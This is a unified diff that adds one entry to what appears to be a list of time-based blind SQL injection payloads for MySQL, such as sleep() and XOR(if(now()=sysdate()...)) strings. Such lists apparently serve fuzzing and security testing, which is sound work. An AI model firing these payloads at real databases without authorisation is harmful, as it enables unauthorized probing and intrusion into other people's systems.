@@ -20,3 +20,4 @@ if(now()=sysdate()%2Csleep(4*2)%2C0)
 (select*from(select(sleep(5)))a)
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 1;SELECT IF((8303>8302),SLEEP(9),2356)#
+(SELECT(0)FROM(SELECT(SLEEP(7)))a)
